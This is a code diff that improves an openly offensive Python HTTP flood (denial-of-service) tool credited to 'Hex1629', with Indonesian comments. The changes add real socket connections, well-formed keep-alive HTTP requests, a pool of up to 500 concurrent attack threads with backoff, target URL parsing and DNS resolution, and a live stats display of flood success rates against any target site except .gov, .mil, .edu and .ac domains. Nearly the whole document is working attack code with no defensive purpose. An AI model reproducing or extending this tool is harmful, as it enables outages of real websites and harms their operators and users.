@@ -61,9 +61,12 @@ def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
     else:
         url_path = generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.settimeout(3)  # Set timeout lebih pendek untuk menghindari hanging
     try:
+        # Attempt connection
+        s.connect((ip,port))
         if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode()
         elif data_type_loader_packet == 'OWN1':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
         elif data_type_loader_packet == 'OWN2':
@@ -94,31 +97,117 @@ def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
         for _ in range(booter_sent):
             s.sendall(packet_data)
             s.send(packet_data)
-    except:
+        s.close()
+        return 'success'
+    except socket.timeout:
         try:
-            s.shutdown(socket.SHUT_RDWR)
             s.close()
         except:
             pass
+        return 'timeout'
+    except socket.error as e:
+        # Connection error - silent fail untuk performance
+        try:
+            s.close()
+        except:
+            pass
+        return 'socket_error'
+    except Exception as e:
+        # Other errors - silent fail
+        try:
+            s.close()
+        except:
+            pass
+        return 'error'
 
 status_code = False
+active_threads = 0
+max_concurrent_threads = 500  # Batas maksimal thread concurrent (dikurangi untuk stabilitas)
+thread_lock = threading.Lock()
+attack_stats = {
+    'total_attempts': 0,
+    'successful_connections': 0,
+    'failed_connections': 0,
+    'timeout_errors': 0,
+    'socket_errors': 0
+}
+stats_lock = threading.Lock()
+
 def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
-    global status_code
-    if status_code == True:
-        while time.time() < time_loader:
-            for _ in range(spam_loader):
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
+    global status_code, active_threads, attack_stats
+    thread_id = threading.current_thread().ident
+    backoff_delay = 0.01  # Initial backoff delay
+    max_backoff = 0.5  # Maximum backoff delay
+    
+    # Langsung jalankan attack tanpa cek status_code
+    while time.time() < time_loader:
+        # Langsung jalankan attack di thread ini juga, tidak hanya membuat thread baru
+        # Ini memastikan ada attack yang berjalan
+        try:
+            result = DoS_Attack(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet)
+            with stats_lock:
+                attack_stats['total_attempts'] += 1
+                if result == 'success':
+                    attack_stats['successful_connections'] += 1
+                elif result == 'timeout':
+                    attack_stats['timeout_errors'] += 1
+                elif result == 'socket_error':
+                    attack_stats['socket_errors'] += 1
+                else:
+                    attack_stats['failed_connections'] += 1
+        except Exception as e:
+            with stats_lock:
+                attack_stats['total_attempts'] += 1
+                attack_stats['failed_connections'] += 1
+        
+        # Buat thread tambahan untuk meningkatkan throughput
+        for _ in range(spam_loader):
+            # Cek jumlah thread aktif sebelum membuat thread baru
+            with thread_lock:
+                if active_threads >= max_concurrent_threads:
+                    # Exponential backoff jika thread limit tercapai
+                    time.sleep(backoff_delay)
+                    backoff_delay = min(backoff_delay * 1.5, max_backoff)
+                    continue
+                active_threads += 1
+                backoff_delay = 0.01  # Reset backoff jika berhasil
+            
+            def attack_with_counter():
+                global active_threads, attack_stats
+                result = None
+                try:
+                    # Langsung jalankan attack
+                    result = DoS_Attack(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet)
+                except Exception as e:
+                    result = 'error'
+                finally:
+                    # Update stats - PASTIKAN selalu diupdate
+                    with stats_lock:
+                        attack_stats['total_attempts'] += 1
+                        if result == 'success':
+                            attack_stats['successful_connections'] += 1
+                        elif result == 'timeout':
+                            attack_stats['timeout_errors'] += 1
+                        elif result == 'socket_error':
+                            attack_stats['socket_errors'] += 1
+                        else:
+                            attack_stats['failed_connections'] += 1
+                    # Decrease active thread count
+                    with thread_lock:
+                        active_threads -= 1
+            
+            try:
+                th = threading.Thread(target=attack_with_counter)
+                th.daemon = True
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
-                th.start()
-    else:
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
+            except RuntimeError as e:
+                # Jika tidak bisa membuat thread, tunggu sebentar
+                with thread_lock:
+                    active_threads -= 1
+                with stats_lock:
+                    attack_stats['failed_connections'] += 1
+                time.sleep(0.1)
+                continue
 prefix_get = "!"
 status_help_type = 0
 def command():
@@ -222,23 +311,107 @@ def command():
             host = ''
             ip = ''
             try:
-                host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+                print(f"{Fore.CYAN}[LOG] {Fore.WHITE}Parsing target URL: {Fore.YELLOW}{target_loader}{Fore.RESET}")
+                is_https = "https://" in target_loader.lower()
+                
+                # Parse URL dengan benar - ambil hanya hostname, bukan path
+                url_clean = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "")
+                # Split berdasarkan "/" dan ambil bagian pertama (hostname)
+                host = url_clean.split("/")[0].split("?")[0]  # Ambil hostname, hapus query string juga
+                
+                print(f"{Fore.CYAN}[LOG] {Fore.WHITE}Extracted hostname: {Fore.YELLOW}{host}{Fore.RESET}")
+                
+                # Port warning
+                if is_https and port_loader == 80:
+                    print(f"{Fore.YELLOW}[WARNING] {Fore.WHITE}HTTPS URL detected but using port 80. Consider using port 443 for HTTPS.{Fore.RESET}")
+                elif not is_https and port_loader == 443:
+                    print(f"{Fore.YELLOW}[WARNING] {Fore.WHITE}HTTP URL detected but using port 443. Consider using port 80 for HTTP.{Fore.RESET}")
+                
                 if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
                     code_leak = False
-                    print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
+                    print(f"{Fore.RED}[ERROR] {Fore.WHITE}Blocked domain type: {Fore.YELLOW}.gov .mil .edu .ac{Fore.RESET}")
                 else:
+                    print(f"{Fore.CYAN}[LOG] {Fore.WHITE}Resolving DNS for {Fore.YELLOW}{host}{Fore.WHITE}...{Fore.RESET}")
                     ip = socket.gethostbyname(host)
+                    print(f"{Fore.GREEN}[LOG] {Fore.WHITE}DNS resolved: {Fore.CYAN}{host}{Fore.WHITE} -> {Fore.CYAN}{ip}{Fore.RESET}")
                     code_leak = True
-            except socket.gaierror:
+            except socket.gaierror as e:
                 code_leak = False
-                print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
+                print(f"{Fore.RED}[ERROR] {Fore.WHITE}DNS resolution failed: {Fore.YELLOW}{str(e)}{Fore.RESET}")
+                print(f"{Fore.RED}[ERROR] {Fore.WHITE}Please check if the hostname is correct and reachable{Fore.RESET}")
+            except Exception as e:
+                code_leak = False
+                print(f"{Fore.RED}[ERROR] {Fore.WHITE}Unexpected error during DNS resolution: {Fore.YELLOW}{str(e)}{Fore.RESET}")
             if code_leak == True:
+             # Reset stats
+             with stats_lock:
+                 attack_stats['total_attempts'] = 0
+                 attack_stats['successful_connections'] = 0
+                 attack_stats['failed_connections'] = 0
+                 attack_stats['timeout_errors'] = 0
+                 attack_stats['socket_errors'] = 0
+             
+             status_code = True  # Set status_code SEBELUM membuat thread
+             print(f"{Fore.GREEN}[+] {Fore.WHITE}Target IP: {Fore.CYAN}{ip}{Fore.RESET}")
+             print(f"{Fore.GREEN}[+] {Fore.WHITE}Target Host: {Fore.CYAN}{host}{Fore.RESET}")
+             print(f"{Fore.GREEN}[+] {Fore.WHITE}Port: {Fore.CYAN}{port_loader}{Fore.RESET}")
+             print(f"{Fore.GREEN}[+] {Fore.WHITE}Duration: {Fore.CYAN}{int(args_get[4])}{Fore.WHITE} seconds{Fore.RESET}")
+             total_threads = create_thread * spam_create_thread
+             print(f"{Fore.GREEN}[+] {Fore.WHITE}Creating {Fore.YELLOW}{total_threads}{Fore.WHITE} worker threads...{Fore.RESET}")
+             thread_count = 0
+             start_time = time.time()
              for loader_num in range(create_thread):
-                sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} OF {create_thread} CREATE THREAD . . .{Fore.RESET}")
+                sys.stdout.write(f"\r {Fore.YELLOW}{loader_num + 1} OF {create_thread} CREATE THREAD . . .{Fore.RESET}")
                 sys.stdout.flush()
                 for _ in range(spam_create_thread):
-                  threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
-             status_code = True
+                  try:
+                    th = threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet))
+                    th.daemon = True
+                    th.start()
+                    thread_count += 1
+                    # Tambahkan delay kecil untuk menghindari thread explosion
+                    if thread_count % 50 == 0:
+                        time.sleep(0.01)
+                  except RuntimeError as e:
+                    print(f"\n{Fore.RED}[!] {Fore.WHITE}Warning: Cannot create more threads ({str(e)}). Continuing with existing threads...{Fore.RESET}")
+                    break
+                if thread_count >= total_threads:
+                    break
+             sys.stdout.write(f"\r {Fore.GREEN}Successfully created {thread_count} worker threads!{Fore.RESET}\n")
+             sys.stdout.flush()
+             
+             # Start stats monitoring thread
+             def print_stats():
+                 last_attempts = 0
+                 last_success = 0
+                 while time.time() < time_loader:
+                     time.sleep(2)  # Update setiap 2 detik
+                     with stats_lock:
+                         stats = attack_stats.copy()
+                     with thread_lock:
+                         active = active_threads
+                     elapsed = time.time() - start_time
+                     
+                     # Calculate rate
+                     attempts_rate = stats['total_attempts'] - last_attempts
+                     success_rate = stats['successful_connections'] - last_success
+                     last_attempts = stats['total_attempts']
+                     last_success = stats['successful_connections']
+                     
+                     # Calculate success percentage
+                     success_pct = (stats['successful_connections'] / stats['total_attempts'] * 100) if stats['total_attempts'] > 0 else 0
+                     
+                     print(f"{Fore.CYAN}[STATS] {Fore.WHITE}Time: {Fore.YELLOW}{int(elapsed)}s{Fore.WHITE} | "
+                           f"Threads: {Fore.YELLOW}{active}/{max_concurrent_threads}{Fore.WHITE} | "
+                           f"Attempts: {Fore.GREEN}{stats['total_attempts']}{Fore.WHITE} ({Fore.GREEN}+{attempts_rate}/2s{Fore.WHITE}) | "
+                           f"Success: {Fore.GREEN}{stats['successful_connections']}{Fore.WHITE} ({Fore.GREEN}+{success_rate}/2s{Fore.WHITE}, {Fore.CYAN}{success_pct:.1f}%{Fore.WHITE}) | "
+                           f"Timeout: {Fore.YELLOW}{stats['timeout_errors']}{Fore.WHITE} | "
+                           f"Socket Err: {Fore.RED}{stats['socket_errors']}{Fore.WHITE} | "
+                           f"Failed: {Fore.RED}{stats['failed_connections']}{Fore.RESET}")
+             
+             stats_thread = threading.Thread(target=print_stats)
+             stats_thread.daemon = True
+             stats_thread.start()
              if GUI_SETUP == 0:
                 clear_text()
                 print(f"{Fore.LIGHTCYAN_EX}Sending Packet {Fore.CYAN}HTTP FLOOD {Fore.LIGHTCYAN_EX}To Target {Fore.WHITE}!\n\n{Fore.YELLOW}    ━╦━━━━━━━━━━━━━━━━━━━━━╦━\n{Fore.LIGHTYELLOW_EX}╚═══╦╩═════════════════════╩╦═══╝\n{Fore.WHITE}       ━ ━ ━ {Fore.LIGHTGREEN_EX}SENDING {Fore.WHITE}━ ━ ━  \n{Fore.LIGHTRED_EX}  ╔═╩═══════════════════════╩═╗\n     {Fore.GREEN}Target: {target_loader}\n       {Fore.GREEN}Port: {port_loader}\n       {Fore.GREEN}Type: {data_type_loader_packet}\n{Fore.RED}  ╚═══════════════════════════╝\n      {Fore.BLUE}@DEV {Fore.WHITE}- {Fore.LIGHTBLUE_EX}Hex1629{Fore.RESET}")
